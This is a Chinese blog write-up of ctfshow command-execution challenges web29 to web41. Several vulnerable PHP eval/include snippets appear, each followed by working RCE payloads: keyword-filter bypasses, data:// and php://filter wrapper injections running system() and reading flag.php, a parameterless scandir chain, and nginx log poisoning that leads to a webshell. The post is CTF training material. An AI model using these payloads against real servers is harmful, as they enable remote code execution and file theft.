class="toc-text">require()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%E5%87%BD%E6%95%B0"><span class="toc-number">5.0.3.</span> <span class="toc-text">include()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web69"><span class="toc-number">6.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web70"><span class="toc-number">7.</span> <span class="toc-text">web70</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#error-reporting-%E5%87%BD%E6%95%B0"><span class="toc-number">7.0.1.</span> <span class="toc-text">error_reporting() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ini-set-%E5%87%BD%E6%95%B0"><span class="toc-number">7.0.2.</span> <span class="toc-text">ini_set()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web71"><span class="toc-number">8.</span> <span class="toc-text">web71</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#s-ob-get-contents"><span class="toc-number">8.0.1.</span> <span class="toc-text">$s &#x3D; ob_get_contents();</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ob-end-clean"><span class="toc-number">8.0.2.</span> <span class="toc-text">ob_end_clean();</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">8.0.3.</span> <span class="toc-text">对缓冲区的理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E7%BB%95%E8%BF%87%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">8.1.</span> <span class="toc-text">对于绕过缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">8.1.1.</span> <span class="toc-text">1.提前送出缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">ob_flush()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.2.</span> <span class="toc-text">flush()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-end-flush-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.1.3.</span> <span class="toc-text">ob_end_flush()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%93%E6%9D%9F%E7%A8%8B%E5%BA%8F"><span class="toc-number">8.1.2.</span> <span class="toc-text">2.结束程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exit-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.2.1.</span> <span class="toc-text">exit()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#die-%E5%87%BD%E6%95%B0"><span class="toc-number">8.1.2.2.</span> <span class="toc-text">die()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">8.2.</span> <span class="toc-text">web72</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">8.2.1.</span> <span class="toc-text">1、目录文件扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF%E8%84%9A%E6%9C%AC"><span class="toc-number">8.2.2.</span> <span class="toc-text">UAF脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web73%E2%80%9374"><span class="toc-number">9.</span> <span class="toc-text">web73–74</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web75%E2%80%9376"><span class="toc-number">10.</span> <span class="toc-text">web75–76</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOAD-FILE-%E5%87%BD%E6%95%B0"><span class="toc-number">10.0.1.</span> <span class="toc-text">LOAD_FILE()函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web77"><span class="toc-number">11.</span> <span class="toc-text">web77</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI%E5%8E%9F%E7%90%86"><span class="toc-number">11.0.1.</span> <span class="toc-text">FFI原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web118"><span class="toc-number">12.</span> <span class="toc-text">web118</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">12.1.</span> <span class="toc-text">#内置变量绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web119"><span class="toc-number">13.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web120"><span class="toc-number">14.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web121"><span class="toc-number">15.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web122"><span class="toc-number">16.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web124"><span class="toc-number">17.</span> <span class="toc-text">web124</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        web入门命令执行篇-ctfshow
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-17T11:10:51.000Z" class="dt-published" itemprop="datePublished">2025-03-17</time>
        
        (Updated: <time datetime="2025-05-16T03:44:23.757Z" class="dt-updated" itemprop="dateModified">2025-05-16</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h1><p>专门写了一个关于RCE和文件包含的总结，所以这里的知识点就删减掉了</p>
<h2 id="2-函数"><a href="#2-函数" class="headerlink" title="2.函数"></a><strong>2.函数</strong></h2><p>1.对于PHP，以下是一些可能存在RCE漏洞的函数：</p>
<p>PHP的system()和exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。</p>
<p>PHP的eval()函数：该函数用于执行字符串作为PHP代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。</p>
<p>PHP的create_function()函数：该函数用于动态创建函数，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。</p>
<p>2.对于ASP（Active Server Pages），以下是一些可能存在RCE漏洞的函数：</p>
<p>ASP的Run()和Exec()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。</p>
<p>ASP的ScriptEngine()函数：该函数用于执行VBScript代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用此函数执行任意代码。</p>
<p>3.对于Java，以下是一些可能存在RCE漏洞的函数：</p>
<p>Java的Runtime.exec()方法：该方法用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用此方法执行任意命令。</p>
<p>Java的ProcessBuilder类：该类用于构建和执行外部进程，如果未对用户输入进行适当的过滤或验证，攻击者可能利用此类执行任意命令。</p>
<p>4.对于Python，以下是一些可能存在RCE漏洞的函数：</p>
<p>Python的os.system()和subprocess.call()函数：这些函数用于执行外部命令，如果未对用户输入进行适当的过滤或验证，攻击者可能利用这些函数执行任意命令。</p>
<p>Python的eval()和exec()函数：这些函数用于执行字符串作为Python代码，如果未对用户输入进行适当的过滤或验证，攻击者可以利用这些函数执行任意代码。</p>
<p>关于php:</p>
<p>PHP代码执行函数：</p>
<p>eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等</p>
<p>PHP命令执行函数：</p>
<p>system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等</p>
<h2 id="3-远程命令执行"><a href="#3-远程命令执行" class="headerlink" title="3.远程命令执行"></a><strong>3.远程命令执行</strong></h2><h3 id="1-函数"><a href="#1-函数" class="headerlink" title="1.函数"></a><strong>1.函数</strong></h3><p>system() 函数允许执行系统命令，并将命令的输出直接打印到标准输出（浏览器或命令行终端）。它的基本语法如下：</p>
<p><strong>system(string $command, &amp;$output, &amp;$return_var);</strong></p>
<ul>
<li>$command：要执行的命令。</li>
<li>$output（可选）：如果提供了这个参数，命令的输出将会被存储在这个数组中，每一行输出作为一个数组元素。</li>
<li>$return_var（可选）：如果提供了这个参数，命令执行后的返回状态码将会被存储在这个变量中。</li>
<li>（exec() 函数返回命令输出的最后一行。如果你需要获取完整的输出，应该使用</li>
</ul>
<p>$output 参数。）</p>
<p>$command 参数是要执行的系统命令。</p>
<p>$output 参数是一个引用，用于存储命令的输出信息。</p>
<p>$return_var 参数是一个引用，用于存储命令的返回值（执行结果）。</p>
<p>除了 system() 函数，还有其他用于执行系统命令的 PHP 函数，例如：</p>
<p>exec() 函数：执行系统命令，并将命令的输出作为一个字符串返回。</p>
<p>passthru() 函数：执行系统命令，并直接将命令的输出发送到标准输出。</p>
<p>shell_exec() 函数：执行系统命令，并将命令的输出作为一个字符串返回。</p>
<p>proc_open() 函数：在一个进程中执行命令，并提供更多的控制和交互选项。</p>
<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="绕过flag"><a href="#绕过flag" class="headerlink" title="#绕过flag"></a>#绕过flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码分析:</p>
<ul>
<li>error_reporting(0)是php中用于关于报错的回显，如果有错误信息，不会直接显示出来。</li>
<li>isset()函数是php中检查定义的值中是否为空，如果不为空将会继续，若是为空就执行 highlight_file(<strong>FILE</strong>)用于显示当前文件。</li>
<li>!preg_match(“&#x2F;flag&#x2F;i”, $c)函数是检查$c中是否包含flag（不区分大小写）</li>
</ul>
<h3 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match ()函数"></a><strong>preg_match ()函数</strong></h3><p>匹配正则表达式模式，分隔符后的”i”标记这是一个大小写不敏感的搜索</p>
<p>模式中的\b标记一个单词边界，所以只有独立的单词会被匹配，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) ：   True </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) ：   False</span><br></pre></td></tr></table></figure>

<p>小技巧：如果仅仅想要检查某个字符串是否包含另外一个字符串，不要使用 preg_match() ， 使用 strpos() 会更快。</p>
<ul>
<li>eval($c)是将$c当做代码进行执行</li>
</ul>
<p>这里的话就是</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;ls&quot;);#查看目录</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202221351137.png" alt="image-20241202221351137"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla?.php&quot;);</span><br><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br><span class="line">?c=system(&quot;tac%20fla\g.php&quot;);</span><br></pre></td></tr></table></figure>

<p>非预期解</p>
<p>1.写入一句话木马用蚁剑连接</p>
<p>2.函数套用?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</p>
<p>3.内敛执行?c&#x3D;echo%20<code>tac%20fla*</code>;</p>
<p>4.利用参数输入<code>?c=eval($_GET[1]);&amp;1=phpinfo();</code></p>
<p>5.利用include参数输入?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>6.利用cp命令将flag拷贝到别处?c&#x3D;system(“cp%20fl*g.php%20a.txt%20”);然后浏览器访问a.txt，读取即可。</p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h3 id="绕过system"><a href="#绕过system" class="headerlink" title="#绕过system"></a>#绕过system</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实与上一题的做法是不变的，只是我们需要绕过system去执行命令，这里我们可以用passthru命令函数</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);</span><br><span class="line">?c=passthru(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>

<p>非预期解的话只要不影响到system的话其实都可以正常使用，如果有system的话换成其他的函数就可以了</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><h3 id="绕过cat和php"><a href="#绕过cat和php" class="headerlink" title="#绕过cat和php"></a>#绕过cat和php</h3><p>过滤了flag，system，php,cat,sort,shell,’.‘,’ ‘,’&#39;‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们用${IFS}代替空格</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);发现可以回显，证明并没有用过滤双引号</span><br><span class="line">?c=passthru(&quot;ca\t$&#123;IFS&#125;fla?????&quot;);</span><br></pre></td></tr></table></figure>

<p><strong>但语句是错误的，后来看了很多大佬的wp，才知道:</strong></p>
<p>因为在php里面$是变量的前缀，是一个特殊字符，我们需要转义特殊字符，$则不再表示变量的意思。</p>
<p>注意：上面的$需要用反斜杠进行转义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&quot;tac\\$&#123;IFS&#125;fla*&quot;);</span><br></pre></td></tr></table></figure>

<p>然后可以获取flag</p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223226048-1733149950287-7.png" alt="image-20241202223226048"></p>
<p>这次过滤了更多了，过滤了&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;</p>
<p>再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了,所以我们这里的话可以用上第一题里面的非预期解去做</p>
<h3 id="1-带参数输入"><a href="#1-带参数输入" class="headerlink" title="1.带参数输入"></a><strong>1.带参数输入</strong></h3><p><strong>?&gt;代替分号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-日志注入"><a href="#2-日志注入" class="headerlink" title="2.日志注入:"></a><strong>2.日志注入:</strong></h3><p>做法:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223505176.png" alt="image-20241202223505176"></p>
<p>比web32多过滤了一个双引号,但33和32都是一个解题方法</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223753099.png" alt="image-20241202223753099"></p>
<p>比web33多过滤了一个冒号，但不影响我们用伪协议</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223810603.png" alt="image-20241202223810603"></p>
<p>比web34多了&lt;和&#x3D;，同上</p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223826336.png" alt="image-20241202223826336"></p>
<p>一样的解题方法通杀，只是参数不要写成数字就行了</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><h3 id="include包含"><a href="#include包含" class="headerlink" title="#include包含"></a>#include包含</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202224028444.png" alt="image-20241202224028444"></p>
<p>与前面不同的是，这里加了一个include语句</p>
<h3 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a><strong>include函数</strong></h3><p><strong>include就是包含文件的函数，把后$c的内容包含进来.</strong></p>
<p>解题思路:</p>
<p><strong>这里我们对$c的值应该设为一串php代码</strong></p>
<p><strong>利用data伪协议读flag</strong></p>
<p>data:&#x2F;&#x2F;，data:&#x2F;&#x2F; 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p>
<p><strong>方法一：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php echo system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?c=data://text/plain,&lt;?php%20system(&#x27;cat fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>查看源码即可得到flag</p>
<p><strong>方法二：</strong>使用base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>查看源码即可得到flag</p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112243907.png" alt="image-20241203112243907"></p>
<p>原理同上一题，多了个php和file过滤,那我们就用data伪协议，但因为php被过滤了，所以我们改一下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br><span class="line">/?c=data://text/plain,&lt;?=`tac fla*`;?&gt;</span><br></pre></td></tr></table></figure>

<p>在PHP中，使用是短标签的写法，等同于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo ... ?&gt;</span><br></pre></td></tr></table></figure>

<p>当然这里有日志注入也是可以的</p>
<p>nginx的日志文件&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>查看源代码 或者通过包含日志文件拿shell</p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><h3 id="include包含-php"><a href="#include包含-php" class="headerlink" title="#include包含.php"></a>#<strong>include包含.php</strong></h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112712388.png" alt="image-20241203112712388"></p>
<p>过滤了flag,限制了.php后缀</p>
<h3 id="include-c-”-php”"><a href="#include-c-”-php”" class="headerlink" title="include($c.”.php”);"></a><strong>include($c.”.php”);</strong></h3><p> 这行代码的作用是将一个PHP文件的内容包含（或插入）到当前执行的脚本中。这里，</p>
<p>$c 是一个变量，它的值会被附加到字符串 “.php” 之前，从而构成要包含文件的完整路径（或至少是文件名，如果文件位于当前工作目录中）。例如，如果 </p>
<p>$c 的值是 “header”，那么 include($c.”.php”); 实际上会尝试包含并执行名为 header.php 的文件。</p>
<p>我们可以试试伪协议，因为不能带有flag，所以filter协议和php:&#x2F;&#x2F;input也不好用了。data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句, .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p>
<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=data://text/plain,&lt;?php%20system(%27tac%20fla*%27);?&gt;</span><br></pre></td></tr></table></figure>

<p>这样就相当于执行了php语句.php</p>
<p>成功获取flag</p>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="无参数rce"><a href="#无参数rce" class="headerlink" title="#无参数rce"></a>#无参数rce</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203112906751.png" alt="image-20241203112906751"></p>
<p><strong>解题思路:</strong></p>
<p>查看目录:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=var_dump(scandir(pos(localeconv())));</span><br><span class="line"></span><br><span class="line">?c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>flag.php在倒数第二位，然后用show_source输出</p>
<p><strong>1.?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</strong></p>
<ul>
<li><strong>payload1解释</strong></li>
</ul>
<p>echo：PHP中的输出函数，用于输出字符串或表达式的结果。</p>
<p>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。</p>
<p>next：PHP中的函数，用于将内部指针向前移动到下一个元素。</p>
<p>array_reverse：PHP中的函数，用于反转数组元素的顺序。</p>
<p>scandir：PHP中的函数，用于列出目录中的文件和子目录。</p>
<p>pos：PHP中的函数，返回数组中当前元素的键名。</p>
<p>localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。</p>
<ul>
<li>具体来说，这段代码的执行流程如下：</li>
</ul>
<p>localeconv()：获取本地化的数字和货币格式信息。</p>
<p>pos(localeconv())：获取localeconv()返回数组的键名。</p>
<p>scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。</p>
<p>array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。</p>
<p>next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。</p>
<p>highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。</p>
<p>echo：输出这个高亮显示的内容。</p>
<p><strong>2.<code>c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;)</code>;</strong></p>
<ul>
<li>payload2解释：</li>
</ul>
<p>?c&#x3D;<code>eval(next(reset(get_defined_vars())));</code>：这是GET请求的一部分，其中c参数的值是一个PHP表达式。</p>
<p>get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。</p>
<p>reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。</p>
<p>next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。</p>
<p>eval()：这个函数执行字符串作为PHP代码。</p>
<p>&amp;1&#x3D;;system(“tac%20flag.php”);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。</p>
<p>system()：这个函数执行一个shell命令，并将完整的输出返回。</p>
<p>“tac%20flag.php”：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。</p>
<p>这段代码的目的是尝试执行flag.php文件的反向内容。</p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="或运算"><a href="#或运算" class="headerlink" title="#或运算"></a>#或运算</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203113345873.png" alt="image-20241203113345873"></p>
